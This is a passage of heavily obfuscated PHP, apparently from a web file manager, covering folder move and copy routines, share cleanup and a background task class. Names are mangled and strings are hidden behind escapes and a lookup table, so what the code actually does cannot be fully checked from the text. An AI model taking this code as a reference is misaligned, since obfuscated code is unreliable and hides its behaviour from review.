$this->lockWriteStart($†Ì¿İÀ¼, $¨¦Ûí½); if (!$º¿ˆğÜñ) { return $this->_moveForce($¢ÇşÆà÷, $†Ì¿İÀ¼, $¨¦Ûí½); } $œâÁ‹Ã = $º¿ˆğÜñ; $Œ‡ÆÔ¦ = !1; if ($ãÚ¶ò³) { if ($Ô¬ğÕÙ == REPEAT_RENAME_FOLDER) { $¨¦Ûí½ = $this->fileNameAuto($†Ì¿İÀ¼, $¨¦Ûí½, $Ô¬ğÕÙ, $ãÚ¶ò³); $œâÁ‹Ã = $this->_moveForce($¢ÇşÆà÷, $†Ì¿İÀ¼, $¨¦Ûí½); } else { if ($Ô¬ğÕÙ == REPEAT_RENAME_FOLDER) { $Ô¬ğÕÙ = REPEAT_RENAME; } $Š“Ó¤ŒÍ = $this->_childrenListSelect($¢ÇşÆà÷); foreach ($Š“Ó¤ŒÍ as $ôŠ»Š¾ä) { $this->_move($ôŠ»Š¾ä[$®ñõ»ã¡[193]], $º¿ˆğÜñ, $Ô¬ğÕÙ, $…–í½¶†); } $Œ‡ÆÔ¦ = !0; } } else { if ($Ô¬ğÕÙ == REPEAT_SKIP) { $Œ‡ÆÔ¦ = !0; } else { if ($Ô¬ğÕÙ == REPEAT_RENAME || $Ô¬ğÕÙ == REPEAT_RENAME_FOLDER) { $¨¦Ûí½ = $this->fileNameAuto($†Ì¿İÀ¼, $¨¦Ûí½, $Ô¬ğÕÙ, $ãÚ¶ò³); $œâÁ‹Ã = $this->_moveForce($¢ÇşÆà÷, $†Ì¿İÀ¼, $¨¦Ûí½); } else { if ($Ô¬ğÕÙ == REPEAT_REPLACE) { $²Ñßã = $this->sourceInfoCache($º¿ˆğÜñ); $•şâÛ¼Í = $this->fileHistory($²Ñßã, $ºÏ’†¨¡[$®ñõ»ã¡[550]], $ºÏ’†¨¡[$®ñõ»ã¡[79]]); $Œ‡ÆÔ¦ = !0; if ($•şâÛ¼Í) { $…–í½¶†[$®ñõ»ã¡[638]][] = $ºÏ’†¨¡[$®ñõ»ã¡[550]]; } } } } } if ($Œ‡ÆÔ¦ && !$…–í½¶†[$®ñõ»ã¡[669]]) { $…–í½¶†[$®ñõ»ã¡[669]] = !0; } return $œâÁ‹Ã; } private function _moveForce($Ì¸ÁÑ£¥, $ùäõ¥Ù­, $éöÃÅ¤) { $Ô¬»Ôõ¯ =& $_SERVER[ç¦¬”œš]; $Õš²”Ì = $this->sourceInfo($Ì¸ÁÑ£¥); $Ü½èûô› = $this->sourceInfo($ùäõ¥Ù­); $Ïíº«±› = $Õš²”Ì[$Ô¬»Ôõ¯[494]] == $Ô¬»Ôõ¯[91]; $İİÖ©õİ = array($Ô¬»Ôõ¯[486] => $Ü½èûô›[$Ô¬»Ôõ¯[193]], $Ô¬»Ôõ¯[661] => $Ü½èûô›[$Ô¬»Ôõ¯[593]] . $Ü½èûô›[$Ô¬»Ôõ¯[193]] . $Ô¬»Ôõ¯[50], $Ô¬»Ôõ¯[657] => $Ü½èûô›[$Ô¬»Ôõ¯[190]], $Ô¬»Ôõ¯[658] => $Ü½èûô›[$Ô¬»Ôõ¯[578]], $Ô¬»Ôõ¯[660] => USER_ID, $Ô¬»Ôõ¯[503] => $éöÃÅ¤); $×ƒ¯ î = $Õš²”Ì[$Ô¬»Ôõ¯[190]] == SourceModel::TYPE_GROUP && $Ü½èûô›[$Ô¬»Ôõ¯[190]] == SourceModel::TYPE_GROUP && $Õš²”Ì[$Ô¬»Ôõ¯[578]] == $Ü½èûô›[$Ô¬»Ôõ¯[578]]; if (!$×ƒ¯ î && $this->moveClearAuth) { Model($Ô¬»Ôõ¯[576])->authClear($Ì¸ÁÑ£¥); } $êšÏğ¸ü = $Õš²”Ì[$Ô¬»Ôõ¯[514]] == $Ô¬»Ôõ¯[91] && $Ü½èûô›[$Ô¬»Ôõ¯[514]] != $Ô¬»Ôõ¯[91]; if ($êšÏğ¸ü) { $İİÖ©õİ[$Ô¬»Ôõ¯[513]] = 0; } if ($Ïíº«±›) { $‚ãîïŒá = array($Ô¬»Ôõ¯[661] => array($Ô¬»Ôõ¯[621], $Õš²”Ì[$Ô¬»Ôõ¯[593]] . $Õš²”Ì[$Ô¬»Ôõ¯[193]] . $Ô¬»Ôõ¯[622])); $»¢’š“ = $Õš²”Ì[$Ô¬»Ôõ¯[593]] . $Õš²”Ì[$Ô¬»Ôõ¯[193]] . $Ô¬»Ôõ¯[50]; $›ÊòÚ§ì = $Ü½èûô›[$Ô¬»Ôõ¯[593]] . $Ü½èûô›[$Ô¬»Ôõ¯[193]] . $Ô¬»Ôõ¯[50] . $Õš²”Ì[$Ô¬»Ôõ¯[193]] . $Ô¬»Ôõ¯[50]; $–ªô¥åò = array($Ô¬»Ôõ¯[661] => array($Ô¬»Ôõ¯[670], "\x72\x65\160\x6c\141\x63\x65\x28\160\141\162\145\156\x74\114\145\166\x65\x6c\54\47{$»¢’š“}\x27\54\x27{$›ÊòÚ§ì}\x27\51"), $Ô¬»Ôõ¯[657] => $Ü½èûô›[$Ô¬»Ôõ¯[190]], $Ô¬»Ôõ¯[658] => $Ü½èûô›[$Ô¬»Ôõ¯[578]]); if ($êšÏğ¸ü) { $–ªô¥åò[$Ô¬»Ôõ¯[513]] = 0; } $this->where($‚ãîïŒá)->data($–ªô¥åò)->save(); } $this->where(array($Ô¬»Ôõ¯[500] => $Ì¸ÁÑ£¥))->data($İİÖ©õİ)->save(); return $Ì¸ÁÑ£¥; } private function clearShare($¨»¦Éé÷, $êÈª„²›) { $ ÊÆ©® =& $_SERVER[ç¦¬”œš]; $ÄÏƒ²ğ = $this->sourceInfo($¨»¦Éé÷); $å€İá± = $this->sourceInfo($êÈª„²›); if ($ÄÏƒ²ğ[$ ÊÆ©®[578]] == $å€İá±[$ ÊÆ©®[578]] && $ÄÏƒ²ğ[$ ÊÆ©®[190]] == $ ÊÆ©®[671]) { return; } $½¯»«Ô = array($ ÊÆ©®[593] => array($ ÊÆ©®[621], $ÄÏƒ²ğ[$ ÊÆ©®[593]] . $¨»¦Éé÷ . $ ÊÆ©®[622])); $à£˜é¥™ = $this->field($ ÊÆ©®[500])->where($½¯»«Ô)->getField($ ÊÆ©®[193], !0); if (!$à£˜é¥™) { return; } $½¯»«Ô = array($ ÊÆ©®[193] => array($ ÊÆ©®[7], $à£˜é¥™), $ ÊÆ©®[672] => 1); $¿êãôÇ = Model($ ÊÆ©®[673])->field($ ÊÆ©®[674])->where($½¯»«Ô)->select(); if (!$¿êãôÇ) { return; } $¿êãôÇ = array_to_keyvalue($¿êãôÇ, $ ÊÆ©®[12], $ ÊÆ©®[674]); $½¯»«Ô = array($ ÊÆ©®[674] => array($ ÊÆ©®[7], $¿êãôÇ)); Model($ ÊÆ©®[673])->where($½¯»«Ô)->save(array($ ÊÆ©®[672] => 0)); Model($ ÊÆ©®[675])->where($½¯»«Ô)->delete(); } public function copyFolderFromIO($‚êÕÑ, $İèƒå­, $«¯««Œİ, $ì÷¨°é£, $ÖºùÚæô, $‚ÁÂ«Ì = false) { $¬òÁãÙ =& $_SERVER[ç¦¬”œš]; $ò«§´µ› = array($¬òÁãÙ[639] => array(), $¬òÁãÙ[640] => array(), $¬òÁãÙ[638] => array(), $¬òÁãÙ[676] => array()); $áêâ»‚â = $‚ÁÂ«Ì ? $‚ÁÂ«Ì : $‚êÕÑ->pathThis($İèƒå­); $ÏÑ¼ı»ğ = $this->fileNameExist($«¯««Œİ, $áêâ»‚â); $›‚Õƒú = $this->mkdir($«¯««Œİ, $áêâ»‚â, $ì÷¨°é£); if (!$ÏÑ¼ı»ğ || $ì÷¨°é£ == REPEAT_RENAME_FOLDER) { $ì÷¨°é£ = !1; } if ($ÏÑ¼ı»ğ) { $this->_childrenAllMake($ÏÑ¼ı»ğ); } Hook::trigger($¬òÁãÙ[677]); $this->_copyChildTo($‚êÕÑ, $İèƒå­, $›‚Õƒú, $ì÷¨°é£, $ò«§´µ›, $ÖºùÚæô); Hook::trigger($¬òÁãÙ[678]); if ($›‚Õƒú) { $this->folderSizeResetChildren($›‚Õƒú); } $this->_childrenListClear(); Model($¬òÁãÙ[641])->addAll($ò«§´µ›[$¬òÁãÙ[639]], array(), !0); Model($¬òÁãÙ[642])->eventCopy($›‚Õƒú); $this->saveAll($ò«§´µ›[$¬òÁãÙ[640]]); Model($¬òÁãÙ[553])->linkAdd($ò«§´µ›[$¬òÁãÙ[638]]); Model($¬òÁãÙ[553])->remove($ò«§´µ›[$¬òÁãÙ[676]]); $this->folderSizeReset($«¯««Œİ); $this->updateModifyTime($«¯««Œİ); return $›‚Õƒú; } private function _copyChildTo($“ÑÅã±œ, $”­û²ùè, $ˆèò­‹ù, $àªéŸà¨, &$êßı´Ùè, $³ù®Øäà) { $•ÁôĞÉ¢ =& $_SERVER[ç¦¬”œš]; $ŠÒãçµ = $this->sourceInfoCache($ˆèò­‹ù); $ŒØ»ßïñ = $“ÑÅã±œ->listPath($”­û²ùè); $ŒØ»ßïñ = $ŒØ»ßïñ ? $ŒØ»ßïñ : array($•ÁôĞÉ¢[86] => array(), $•ÁôĞÉ¢[85] => array()); $š¢´«´¤ = array_merge($ŒØ»ßïñ[$•ÁôĞÉ¢[86]], $ŒØ»ßïñ[$•ÁôĞÉ¢[85]]); $‹ñÂÎª = $this->_addFiles($“ÑÅã±œ, $ŒØ»ßïñ[$•ÁôĞÉ¢[86]], $³ù®Øäà); $Œø¯£´› = array(); foreach ($š¢´«´¤ as &$£îÜ°ûš) { if (isset($‹ñÂÎª[$£îÜ°ûš[$•ÁôĞÉ¢[32]]])) { $£îÜ°ûš = $‹ñÂÎª[$£îÜ°ûš[$•ÁôĞÉ¢[32]]]; } $£îÜ°ûš[$•ÁôĞÉ¢[494]] = $£îÜ°ûš[$•ÁôĞÉ¢[33]] == $•ÁôĞÉ¢[78]; $£îÜ°ûš[$•ÁôĞÉ¢[495]] = substr(_get($£îÜ°ûš, $•ÁôĞÉ¢[169], $•ÁôĞÉ¢[12]), 0, 10); $£îÜ°ûš[$•ÁôĞÉ¢[79]] = _get($£îÜ°ûš, $•ÁôĞÉ¢[79], 0); $£îÜ°ûš[$•ÁôĞÉ¢[550]] = _get($£îÜ°ûš, $•ÁôĞÉ¢[550], 0); if (!isset($£îÜ°ûš[$•ÁôĞÉ¢[679]]) && $£îÜ°ûš[$•ÁôĞÉ¢[550]]) { $êßı´Ùè[$•ÁôĞÉ¢[676]][] = $£îÜ°ûš[$•ÁôĞÉ¢[550]]; } if ($àªéŸà¨) { $àğíŒ–à = $this->fileNameExistCache($ˆèò­‹ù, $£îÜ°ûš[$•ÁôĞÉ¢[32]]); if ($àğíŒ–à) { if ($£îÜ°ûš[$•ÁôĞÉ¢[494]] || $àªéŸà¨ == REPEAT_SKIP) { continue; } if ($àªéŸà¨ == REPEAT_REPLACE) { $‡£óù†º = $this->sourceInfoCache($àğíŒ–à); $°‡Ù¿ÊŸ = $this->fileHistory($‡£óù†º, $£îÜ°ûš[$•ÁôĞÉ¢[550]], $£îÜ°ûš[$•ÁôĞÉ¢[79]]); if ($°‡Ù¿ÊŸ) { $êßı´Ùè[$•ÁôĞÉ¢[638]][] = $£îÜ°ûš[$•ÁôĞÉ¢[550]]; } continue; } else { if ($àªéŸà¨ == REPEAT_RENAME) { $£îÜ°ûš[$•ÁôĞÉ¢[32]] = $this->fileNameAutoCache($ˆèò­‹ù, $£îÜ°ûš[$•ÁôĞÉ¢[32]], $àªéŸà¨, !1); } } } } if (!$£îÜ°ûš[$•ÁôĞÉ¢[494]] && $£îÜ°ûš[$•ÁôĞÉ¢[550]] == 0) { continue; } if (!$£îÜ°ûš[$•ÁôĞÉ¢[494]] && $£îÜ°ûš[$•ÁôĞÉ¢[550]]) { $êßı´Ùè[$•ÁôĞÉ¢[638]][] = $£îÜ°ûš[$•ÁôĞÉ¢[550]]; } $Œø¯£´›[] = $this->_makeItemData($£îÜ°ûš, $ŠÒãçµ, $£îÜ°ûš[$•ÁôĞÉ¢[32]]); } unset($£îÜ°ûš); if (!empty($Œø¯£´›)) { $this->addAll($Œø¯£´›); $this->_childrenListSelect($ˆèò­‹ù); } $¦˜€¡•³ = $this->_childrenList($ˆèò­‹ù); $¦˜€¡•³ = array_to_keyvalue($¦˜€¡•³, $•ÁôĞÉ¢[32]); foreach ($š¢´«´¤ as $£îÜ°ûš) { $‡£óù†º = $¦˜€¡•³[$£îÜ°ûš[$•ÁôĞÉ¢[32]]]; $ù¤å™‚â = $‡£óù†º[$•ÁôĞÉ¢[193]]; $this->_copyApplyMeta($‡£óù†º, $êßı´Ùè); if ($£îÜ°ûš[$•ÁôĞÉ¢[33]] == $•ÁôĞÉ¢[78]) { $£îÜ°ûš[$•ÁôĞÉ¢[87]] = $“ÑÅã±œ->getPathInner($£îÜ°ûš[$•ÁôĞÉ¢[87]]); $this->_copyChildTo($“ÑÅã±œ, $£îÜ°ûš[$•ÁôĞÉ¢[87]], $ù¤å™‚â, $àªéŸà¨, $êßı´Ùè, $³ù®Øäà); } } } private function _addFiles($£äÊôøù, $ë§‰Œù¥, $µµËıœ¢) { $§Ç¥­‘Ğ =& $_SERVER[ç¦¬”œš]; if (!$ë§‰Œù¥ || count($ë§‰Œù¥) == 0) { return array(); } $¤øîéÒ˜ = array(); foreach ($ë§‰Œù¥ as &$¿Ù‹¼õ) { Hook::trigger($§Ç¥­‘Ğ[680], $¿Ù‹¼õ); $¿Ù‹¼õ[$§Ç¥­‘Ğ[87]] = $£äÊôøù->getPathInner($¿Ù‹¼õ[$§Ç¥­‘Ğ[87]]); $¾…¨Š¸È = $£äÊôøù->hashSimple($¿Ù‹¼õ[$§Ç¥­‘Ğ[87]]); $‰éíğü² = $£äÊôøù->hashMd5($¿Ù‹¼õ[$§Ç¥­‘Ğ[87]]); if (strlen($‰éíğü²) > 10 && !isset($¤øîéÒ˜[$‰éíğü²])) { $¤øîéÒ˜[$‰éíğü²] = array(); } $¿Ù‹¼õ[$§Ç¥­‘Ğ[681]] = $¾…¨Š¸È; $¿Ù‹¼õ[$§Ç¥­‘Ğ[556]] = $‰éíğü²; $¤øîéÒ˜[$‰éíğü²][] =& $¿Ù‹¼õ; if (count($¤øîéÒ˜[$‰éíğü²]) > 1) { $¿Ù‹¼õ[$§Ç¥­‘Ğ[679]] = !0; } Hook::trigger($§Ç¥­‘Ğ[682], $¿Ù‹¼õ); } unset($¿Ù‹¼õ); $»«¢İßª = array($§Ç¥­‘Ğ[556] => array($§Ç¥­‘Ğ[7], array_keys($¤øîéÒ˜))); $Ï›¸œôé = Model($§Ç¥­‘Ğ[683]); $Ôú×¸Ëï = $Ï›¸œôé->where($»«¢İßª)->select(); $Ôú×¸Ëï = $Ôú×¸Ëï ? $Ôú×¸Ëï : array(); foreach ($Ôú×¸Ëï as $«åÙáÈÅ) { if (!isset($¤øîéÒ˜[$«åÙáÈÅ[$§Ç¥­‘Ğ[556]]])) { continue; } $Ÿ°ëË¶ = $¤øîéÒ˜[$«åÙáÈÅ[$§Ç¥­‘Ğ[556]]]; foreach ($Ÿ°ëË¶ as &$¿Ù‹¼õ) { $¿Ù‹¼õ[$§Ç¥­‘Ğ[550]] = $«åÙáÈÅ[$§Ç¥­‘Ğ[550]]; $¿Ù‹¼õ[$§Ç¥­‘Ğ[679]] = !0; } unset($¿Ù‹¼õ); } $ÛÁÜŒ«ğ = array(); foreach ($ë§‰Œù¥ as $³ò™æ¬) { Hook::trigger($§Ç¥­‘Ğ[684], $³ò™æ¬); if (isset($³ò™æ¬[$§Ç¥­‘Ğ[679]]) && $³ò™æ¬[$§Ç¥­‘Ğ[679]]) { Hook::trigger($§Ç¥­‘Ğ[685], $³ò™æ¬); continue; } $¸ÖÆğÓ = $£äÊôøù->getPathInner($³ò™æ¬[$§Ç¥­‘Ğ[87]]); $…Ï½¬Ü¯ = $Ï›¸œôé->addFileMake($¸ÖÆğÓ, $³ò™æ¬[$§Ç¥­‘Ğ[79]], $³ò™æ¬[$§Ç¥­‘Ğ[681]], $³ò™æ¬[$§Ç¥­‘Ğ[556]], $³ò™æ¬[$§Ç¥­‘Ğ[32]], $µµËıœ¢); Hook::trigger($§Ç¥­‘Ğ[685], $³ò™æ¬); if (!is_array($…Ï½¬Ü¯)) { continue; } $ÛÁÜŒ«ğ[] = $…Ï½¬Ü¯; } $Ï›¸œôé->addAll($ÛÁÜŒ«ğ); $»«¢İßª = array($§Ç¥­‘Ğ[556] => array($§Ç¥­‘Ğ[7], array_keys($¤øîéÒ˜))); $Ôú×¸Ëï = $Ï›¸œôé->where($»«¢İßª)->select(); $Ôú×¸Ëï = $Ôú×¸Ëï ? $Ôú×¸Ëï : array(); foreach ($Ôú×¸Ëï as $«åÙáÈÅ) { if (!isset($¤øîéÒ˜[$«åÙáÈÅ[$§Ç¥­‘Ğ[556]]])) { continue; } $Ó¹õ¦ÎÅ =& $¤øîéÒ˜[$«åÙáÈÅ[$§Ç¥­‘Ğ[556]]]; foreach ($Ó¹õ¦ÎÅ as &$¿Ù‹¼õ) { $¿Ù‹¼õ[$§Ç¥­‘Ğ[550]] = $«åÙáÈÅ[$§Ç¥­‘Ğ[550]]; } unset($¿Ù‹¼õ); } $Í›µÇ¢‘ = array(); foreach ($ë§‰Œù¥ as $ş™ç†ÇĞ) { $Í›µÇ¢‘[$ş™ç†ÇĞ[$§Ç¥­‘Ğ[32]]] = $ş™ç†ÇĞ; } return $Í›µÇ¢‘; } } define($_SERVER[ç¦¬”œš][686], $_SERVER[ç¦¬”œš][687]); $nklvuswtpq = $_SERVER[ç¦¬”œš][688]; goto BÒœ¸ÒÌš; cš«°ÒÖÑÅ: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\151\154\x65\x5f\x63\157\156\164\x65\x6e\164\x73"; protected $dataAuto = array(array("\x63\162\145\141\164\145\124\x69\155\x65", "\x74\151\155\145", "\x69\x6e\163\x65\x72\x74", "\146\165\156\143\164\x69\157\156")); } $_file = $_SERVER[$_SERVER[ç¦¬”œš][472]]; $_size = $_SERVER[ç¦¬”œš][473]; goto c…¸Ñ×¤ù‚; e­Ò§£Æ: class Task { const STATYS_STOP = "\163\164\157\160"; const STATYS_RUNNING = "\x72\165\x6e\x6e\151\x6e\147"; const STATYS_KILL = "\153\x69\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($êÃå‹ÉÔ, $ˆàÇ¶ç† = '', $“ñòÎÊÒ = 0, $¥ÃĞ¡ÏÍ = '') { $ÓÒ‰ÚÖ =& $_SERVER[ç¦¬”œš]; if (self::get($êÃå‹ÉÔ)) { return; } $this->task = array($ÓÒ‰ÚÖ[484] => $êÃå‹ÉÔ, $ÓÒ‰ÚÖ[1770] => USER_ID, $ÓÒ‰ÚÖ[1659] => $¥ÃĞ¡ÏÍ, $ÓÒ‰ÚÖ[535] => $ÓÒ‰ÚÖ[12], $ÓÒ‰ÚÖ[33] => $ˆàÇ¶ç†, $ÓÒ‰ÚÖ[1144] => $ÓÒ‰ÚÖ[12], $ÓÒ‰ÚÖ[1142] => $“ñòÎÊÒ, $ÓÒ‰ÚÖ[1771] => 0, $ÓÒ‰ÚÖ[1772] => 0, $ÓÒ‰ÚÖ[1773] => 0, $ÓÒ‰ÚÖ[1774] => timeFloat(), $ÓÒ‰ÚÖ[1775] => 0, $ÓÒ‰ÚÖ[1776] => 0, $ÓÒ‰ÚÖ[1777] => 0, $ÓÒ‰ÚÖ[1778] => 0, $ÓÒ‰ÚÖ[830] => $ÓÒ‰ÚÖ[1720]); $GLOBALS[$ÓÒ‰ÚÖ[1779]] = 1; Hook::bind($ÓÒ‰ÚÖ[1724], array($this, $ÓÒ‰ÚÖ[1780])); Hook::bind($ÓÒ‰ÚÖ[1781], array($this, $ÓÒ‰ÚÖ[1782])); $this->startAfter(); Hook::trigger($ÓÒ‰ÚÖ[1783], $this->task); $this->task[$ÓÒ‰ÚÖ[1776]] = timeFloat(); } public function end($œ¬ˆÕíŞ = '') { $Ë•ÔäĞÀ =& $_SERVER[ç¦¬”œš]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Ë•ÔäĞÀ[1776]]) { self::valueSet($this->task[$Ë•ÔäĞÀ[484]], !1); } $this->isEnd = !0; if ($œ¬ˆÕíŞ) { $this->task[$Ë•ÔäĞÀ[535]] = $œ¬ˆÕíŞ; } self::log($Ë•ÔäĞÀ[1784] . $this->task[$Ë•ÔäĞÀ[484]] . $Ë•ÔäĞÀ[1785] . sprintf($Ë•ÔäĞÀ[930], timeFloat() - $this->task[$Ë•ÔäĞÀ[1774]]) . $Ë•ÔäĞÀ[1786]); Hook::unbind($Ë•ÔäĞÀ[1724], array($this, $Ë•ÔäĞÀ[1780])); Hook::unbind($Ë•ÔäĞÀ[1781], array($this, $Ë•ÔäĞÀ[1782])); $this->endAfter(); $ğÃë¸˜÷ = $this->task; $this->task = !1; Hook::trigger($Ë•ÔäĞÀ[1787], $ğÃë¸˜÷); } public function update($Ÿ«ª¬ß³ = 0, $õş—ì®˜ = false) { $ğ¹¹ïÙ =& $_SERVER[ç¦¬”œš]; $ÏüÒÏÕø =& $this->task; if (!$ÏüÒÏÕø) { return; } $ÏüÒÏÕø[$ğ¹¹ïÙ[1771]] += $Ÿ«ª¬ß³; $ÏüÒÏÕø[$ğ¹¹ïÙ[1775]] = timeFloat(); if ($ÏüÒÏÕø[$ğ¹¹ïÙ[1142]]) { if ($ÏüÒÏÕø[$ğ¹¹ïÙ[1142]] < $ÏüÒÏÕø[$ğ¹¹ïÙ[1771]]) { $ÏüÒÏÕø[$ğ¹¹ïÙ[1142]] = $ÏüÒÏÕø[$ğ¹¹ïÙ[1771]]; } $½“éãÌ = timeFloat() - $ÏüÒÏÕø[$ğ¹¹ïÙ[1774]] - $ÏüÒÏÕø[$ğ¹¹ïÙ[1777]]; if ($½“éãÌ <= 0) { $½“éãÌ = 0.001; } $ÏüÒÏÕø[$ğ¹¹ïÙ[1772]] = $ÏüÒÏÕø[$ğ¹¹ïÙ[1771]] / $ÏüÒÏÕø[$ğ¹¹ïÙ[1142]]; $ÏüÒÏÕø[$ğ¹¹ïÙ[1773]] = $ÏüÒÏÕø[$ğ¹¹ïÙ[1771]] / $½“éãÌ; if ($ÏüÒÏÕø[$ğ¹¹ïÙ[1772]] > 0) { $ÏüÒÏÕø[$ğ¹¹ïÙ[1778]] = $½“éãÌ * (1 - $ÏüÒÏÕø[$ğ¹¹ïÙ[1772]]) / $ÏüÒÏÕø[$ğ¹¹ïÙ[1772]]; } $ÏüÒÏÕø[$ğ¹¹ïÙ[1778]] = $ÏüÒÏÕø[$ğ¹¹ïÙ[1778]] <= 0 ? 0 : $ÏüÒÏÕø[$ğ¹¹ïÙ[1778]]; } $this->updateAfter(); $ÕÕœÏšÕ = 0.2; if (timeFloat() - $ÏüÒÏÕø[$ğ¹¹ïÙ[1776]] < $ÕÕœÏšÕ && !$õş—ì®˜) { return; } $õ¥ï‰ğ = self::get($ÏüÒÏÕø[$ğ¹¹ïÙ[484]]); $­ÔÛ³Ö• = $õ¥ï‰ğ[$ğ¹¹ïÙ[830]]; if ($­ÔÛ³Ö• == self::STATYS_KILL) { $‘Ã•°¿¶ = array($ğ¹¹ïÙ[1788] => LNG($ğ¹¹ïÙ[1789]), $ğ¹¹ïÙ[1298] => !1); Cache::set($ğ¹¹ïÙ[1790] . $this->task[$ğ¹¹ïÙ[484]], $‘Ã•°¿¶, 30); $this->onKill(); $this->end(); die; } else { if ($­ÔÛ³Ö• == self::STATYS_STOP) { $¥áğÃŞ¥ = 2; $õ¥ï‰ğ[$ğ¹¹ïÙ[1777]] += $¥áğÃŞ¥; self::valueSet($ÏüÒÏÕø[$ğ¹¹ïÙ[484]], $õ¥ï‰ğ); sleep($¥áğÃŞ¥); $this->update(); return; } } $ÏüÒÏÕø[$ğ¹¹ïÙ[830]] = $­ÔÛ³Ö• ? $­ÔÛ³Ö• : $ÏüÒÏÕø[$ğ¹¹ïÙ[830]]; $ÏüÒÏÕø[$ğ¹¹ïÙ[1777]] = $õ¥ï‰ğ[$ğ¹¹ïÙ[1777]] ? $õ¥ï‰ğ[$ğ¹¹ïÙ[1777]] : 0; $ÏüÒÏÕø[$ğ¹¹ïÙ[1776]] = timeFloat(); Hook::trigger($ğ¹¹ïÙ[1791], $ÏüÒÏÕø); self::valueSet($ÏüÒÏÕø[$ğ¹¹ïÙ[484]], $ÏüÒÏÕø); } public function onKillSet($àÂéÄ–é, $Õ³®Åœ• = array()) { $this->onKillCall = array($àÂéÄ–é, $Õ³®Åœ•); } public function onKill() { $úÖı¤ÕÓ =& $_SERVER[ç¦¬”œš]; self::log($úÖı¤ÕÓ[1784] . $this->task[$úÖı¤ÕÓ[484]] . $úÖı¤ÕÓ[1792]); Hook::trigger($úÖı¤ÕÓ[1793], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¬«Ô†´Í) { $µ¨¾ÅäØ =& $_SERVER[ç¦¬”œš]; Cache::set($µ¨¾ÅäØ[1790] . $this->task[$µ¨¾ÅäØ[484]], $¬«Ô†´Í, 60); return $¬«Ô†´Í; } public static function get($©ÑŞÕãé) { $ı©ìµÖ¬ =& $_SERVER[ç¦¬”œš]; $ö†“µÍ¥ = self::valueGet($©ÑŞÕãé); if (is_array($ö†“µÍ¥) && $ö†“µÍ¥[$ı©ìµÖ¬[1794]]) { $Ş“¹‘¡ü = ActionApply($ö†“µÍ¥[$ı©ìµÖ¬[1794]], array($ö†“µÍ¥)); $ö†“µÍ¥ = is_array($Ş“¹‘¡ü) ? $Ş“¹‘¡ü : $ö†“µÍ¥; } return $ö†“µÍ¥; } public static function listData() { $†‹àôª³ = self::valueGet(); return array_sort_by($†‹àôª³, $_SERVER[ç¦¬”œš][1774], !0); } public static function kill($€‡¶€¿ä) { return self::changeStatus($€‡¶€¿ä, self::STATYS_KILL); } public static function stop($Œæ„Ãƒ) { return self::changeStatus($Œæ„Ãƒ, self::STATYS_STOP); } public static function restart($ê’š¬©¬) { return self::changeStatus($ê’š¬©¬, self::STATYS_RUNNING); } public static function killAll() { $µòÇ”âª =& $_SERVER[ç¦¬”œš]; $“¹·˜ôÒ = self::listData(); foreach ($“¹·˜ôÒ as $÷şêõè) { self::kill($÷şêõè[$µòÇ”âª[484]]); } sleep(2); foreach ($“¹·˜ôÒ as $÷şêõè) { self::valueSet($÷şêõè[$µòÇ”âª[484]], !1); } } private static function changeStatus($¸”’Ìé, $œ˜£Æ×£) { $¹ô¥Ùö =& $_SERVER[ç¦¬”œš]; $œîøò×ø = self::valueGet($¸”’Ìé); if (!$œîøò×ø) { return !1; } $œîøò×ø[$¹ô¥Ùö[830]] = $œ˜£Æ×£; self::valueSet($¸”’Ìé, $œîøò×ø); self::log($¹ô¥Ùö[1795] . $œîøò×ø[$¹ô¥Ùö[484]] . $¹ô¥Ùö[1796] . $œ˜£Æ×£); return !0; } public static function valueGet($²Ö«Üá = false) { $Û¾ŠöÕó =& $_SERVER[ç¦¬”œš]; if ($²Ö«Üá) { $““–´ÊĞ = Model($Û¾ŠöÕó[529])->where(array($Û¾ŠöÕó[97] => $²Ö«Üá, $Û¾ŠöÕó[33] => $Û¾ŠöÕó[1151]))->find(); return $““–´ÊĞ ? json_decode($““–´ÊĞ[$Û¾ŠöÕó[450]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($²›Ù€Ë© = false) { $ØßÜ •­ =& $_SERVER[ç¦¬”œš]; $„õıÌÄ­ = array($ØßÜ •­[33] => $ØßÜ •­[1151]); if ($²›Ù€Ë©) { $„õıÌÄ­[$ØßÜ •­[1770]] = $²›Ù€Ë©; } $àŠ°†£¿ = Model($ØßÜ •­[529])->where($„õıÌÄ­)->select(); $àŠ°†£¿ = $àŠ°†£¿ ? $àŠ°†£¿ : array(); foreach ($àŠ°†£¿ as $•ŞÑŸèİ => $ŞÌ‰±æ…) { $àŠ°†£¿[$•ŞÑŸèİ] = json_decode($ŞÌ‰±æ…[$ØßÜ •­[450]], !0); } return $àŠ°†£¿; } public static function valueSet($Õ¤ÎÊ—, $°…ÑÚ€ˆ) { $ÓÃÛ£Ç =& $_SERVER[ç¦¬”œš]; if (!$°…ÑÚ€ˆ) { return Model($ÓÃÛ£Ç[529])->where(array($ÓÃÛ£Ç[97] => $Õ¤ÎÊ—, $ÓÃÛ£Ç[33] => $ÓÃÛ£Ç[1151]))->delete(); } $ê“ŒÁ = json_encode($°…ÑÚ€ˆ); if (!$ê“ŒÁ) { ob_start(); var_dump($°…ÑÚ€ˆ); $¹Ş§¬Ú = ob_get_clean(); self::log($ÓÃÛ£Ç[1797] . json_encode_force($¹Ş§¬Ú)); } if (!$Õ¤ÎÊ— || !$°…ÑÚ€ˆ[$ÓÃÛ£Ç[484]]) { return !1; } $Ó’Ãà¹š = array($ÓÃÛ£Ç[33] => $ÓÃÛ£Ç[1151], $ÓÃÛ£Ç[1770] => USER_ID, $ÓÃÛ£Ç[97] => $Õ¤ÎÊ—, $ÓÃÛ£Ç[450] => $ê“ŒÁ); $†¶ô·°Ş = $ÓÃÛ£Ç[1798]; CacheLock::lock($†¶ô·°Ş); Model($ÓÃÛ£Ç[529])->add($Ó’Ãà¹š, array(), !0); CacheLock::unlock($†¶ô·°Ş); } public static function log($­…¯àÔµ) { if (!GLOBAL_DEBUG) { return; } write_log($­…¯àÔµ, $_SERVER[ç¦¬”œš][1799]); } } class TaskFileTransfer extends Task { protected function startAfter() { $Ú±Ø¸ŠÁ =& $_SERVER[ç¦¬”œš]; $ã€€¬—… =& 